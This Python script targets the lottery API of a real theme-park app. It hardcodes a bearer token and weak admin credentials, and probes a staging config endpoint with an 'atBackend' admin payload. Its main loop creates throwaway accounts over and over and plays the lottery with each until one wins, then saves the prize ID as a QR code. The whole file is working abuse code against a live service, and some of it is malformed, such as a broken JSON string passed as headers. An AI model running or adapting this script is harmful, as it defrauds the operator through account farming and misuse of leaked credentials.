import requests
import time
import colorama

import qrcode
from PIL import Image

headers = {
    'Content-Type': 'application/json',
    'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkYXRhIjp7InVzZXJJZCI6IjZlYTFlMmE3LWI2MGMtNGNhNS1hOTk3LTZiYTU1MTgzNDI0YSJ9LCJleHAiOjE2NDA5MjQ0NzEsImlhdCI6MTY0MDg5NTY3MX0.oBviZhKq16GrekCnemMPNJBvKF_oCoDbIj3JSGkc__E'
}

admin_data = '{"userId":"6ea1e2a7-b60c-4ca5-a997-6ba55183424a","password":"admin"}'

admin_backend_data = '{"atBackend": true, "userId": "ad155ef7-6544-434e-a168-5bf80a10f48c", "password": "cook}'

# users/create

#response = requests.post('https://sdapp.europapark.de/users/create', headers=headers, data=data)

#response = requests.post('https://sdapp.europapark.de/auth/login', headers=headers, data=data)

#response = requests.post('https://sdapp.europapark.de/lottery', headers=headers, data=data)

# check

def getConfig():
    response = requests.get('https://gcp-sdapp-stage.europapark.de/config', headers=admin_backend_data)
    return response.json()

def userLogin():
    data = '{"userId":"6ea1e2a7-b60c-4ca5-a997-6ba55183424a","password":"admin"}'
    response = requests.post('https://sdapp.europapark.de/auth/login', headers=headers, data=data)
    return response.json()

def createUser():
    data = '{"password":"default"}'
    response = requests.post('https://sdapp.europapark.de/users/create', headers=headers, data=data)
    return response.json()


def playLottery(token):
    headers = {
        'Content-Type': 'application/json',
        'Authorization': 'Bearer ' + token
    }

    response = requests.post('https://sdapp.europapark.de/lottery', headers=headers)
    return response.json()

def checkPrize(token, prizeid):
    headers = {
        'Content-Type': 'application/json',
        'Authorization': 'Bearer ' + token
    }

    data = '{"prizeId":"' + prizeid + '"}'
    response = requests.post('https://sdapp.europapark.de/check', headers=headers, data=data)
    return response.json()

def play():
    lottery_result = playLottery(createUser()["token"])

    while(lottery_result['status'] != 'won'):
        lottery_result = playLottery(createUser()["token"])
        # Red Lose
        print(colorama.Fore.RED + "Lose " + colorama.Fore.RESET + str(lottery_result) )

        time.sleep(1)

    print(colorama.Fore.GREEN + "Won " + colorama.Fore.RESET + str(lottery_result) )
    
    img = qrcode.make(lottery_result['prizeId'])
    img.save('qr.png')
    print("WON")

        

play()